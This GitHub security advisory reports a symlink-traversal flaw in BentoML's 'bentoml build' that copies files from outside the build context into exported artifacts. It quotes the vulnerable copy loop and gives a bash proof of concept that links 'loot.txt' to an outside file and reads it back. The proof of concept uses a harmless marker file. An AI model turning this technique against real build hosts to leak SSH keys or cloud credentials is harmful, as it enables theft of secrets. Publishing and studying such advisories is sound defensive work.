# [M] BentoML has Information Disclosure in `bentoml build` via symlink traversal in the build context

## Summary
Severity: Medium
Advisory: GHSA-mcfx-4vc6-qgxv
CVE: CVE-2026-40610
CWE: CWE-59
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-mcfx-4vc6-qgxv
Type: github-advisory

## Affected
- PyPI: `bentoml` — affected >=0 <1.4.39

## Details
### Summary
BentoML's `bentoml build` packaging workflow follows attacker-controlled symlinks inside the build context and copies the referenced file contents into the generated Bento artifact.

If a victim builds an untrusted repository or other attacker-supplied build context, the attacker can place a symlink such as `loot.txt -> /tmp/outside-marker.txt` or a link to a more sensitive local file. When `bentoml build` runs, BentoML dereferences the symlink and packages the target file contents into the Bento. The leaked file can then propagate further through export, push, or containerization workflows.

### Details
The vulnerable code walks files under the build context and copies each matched entry into the Bento source directory:

```python
for root, _, files in os.walk(ctx_path):
    for f in files:
        dir_path = os.path.relpath(root, ctx_path)
        path = os.path.join(dir_path, f).replace(os.sep, "/")
        if specs.includes(path):
            src_file = ctx_path.joinpath(path)
            dst_file = target_fs.joinpath(dest_path)
            shutil.copy(src_file, dst_file)
```

There is no validation that the resolved path of `src_file` remains inside `ctx_path` before `shutil.copy` dereferences the source path. As a result, a repository-controlled symlink can cross the trust boundary from `attacker-controlled repository content` to `developer/CI host filesystem` during the build process.

This is a build-time path traversal / symlink traversal issue in the packaging feature, not a runtime API issue. The resulting Bento may later be exported, pushed to remote storage, or converted into a container image, which amplifies the leakage impact.

### PoC
The issue was verified in WSL against BentoML 1.4.38. The following script reproduces the vulnerability by using a harmless marker file outside the build directory.

```bash
mkdir -p /tmp/bento-symlink-poc
cd /tmp/bento-symlink-poc

printf 'BENTOML_SYMLINK_POC_123456\n' > /tmp/outside-marker.txt

cat > service.py <<'EOF'
import bentoml

@bentoml.service
class Demo:
    @bentoml.api
    def ping(self, x: str) -> str:
        return x
EOF

cat > bentofile.yaml <<'EOF'
service: "service:Demo"
include:
  - "service.py"
  - "loot.txt"
EOF

ln -s /tmp/outside-marker.txt loot.txt

bentoml build --output tag
bentoml export demo:7pilrpjtlomelwct /tmp/poc.zip

mkdir -p /tmp/poc-unzip
unzip -o /tmp/poc.zip -d /tmp/poc-unzip
find /tmp/poc-unzip -name loot.txt -print
cat /tmp/poc-unzip/**/src/loot.txt 2>/dev/null || \
find /tmp/poc-unzip -path '*/src/loot.txt' -exec cat {} \;
```

- The script creates `/tmp/outside-marker.txt` outside the build context as a stand-in for a sensitive local file.
- It creates a minimal BentoML service and explicitly includes `loot.txt` in `bentofile.yaml`.
- It creates `loot.txt` as a symlink to the external marker file.
<img width="1531" height="648" alt="image" src="https://github.com/user-attachments/assets/1312dcf0-74b0-4fb6-a05d-b68644470d82" />

- It runs `bentoml build`, exports the generated Bento, unzips it, and reads the packaged `src/loot.txt`.
- Successful exploitation is confirmed when the packaged file contains `BENTOML_SYMLINK_POC_123456`, proving that BentoML copied the external file contents rather than keeping only the symlink.
<img width="1315" height="121" alt="image" src="https://github.com/user-attachments/assets/6ed34f51-9b68-4fa9-8a42-011deb84d54e" />


<img width="1697" height="760" alt="image" src="https://github.com/user-attachments/assets/9b8a8ae5-4f06-46b4-9e4a-dee25cc5d203" />


### Impact
An attacker who can cause a developer, release engineer, or CI system to run `bentoml build` on an attacker-controlled repository can exfiltrate local files from the build host into the Bento artifact.

This can expose secrets such as cloud credentials, SSH keys, API tokens, environment files, or other sensitive local configuration. Because Bento artifacts are commonly exported, uploaded, stored, or containerized after build, the leaked file contents can spread beyond the original build machine.

## References
- https://github.com/bentoml/BentoML/security/advisories/GHSA-mcfx-4vc6-qgxv
- https://nvd.nist.gov/vuln/detail/CVE-2026-40610
- https://github.com/bentoml/BentoML/commit/5fb7cd41f92e2a56b45391284cf15b9ac9963a1f
- https://github.com/bentoml/BentoML
- https://github.com/bentoml/BentoML/releases/tag/v1.4.39
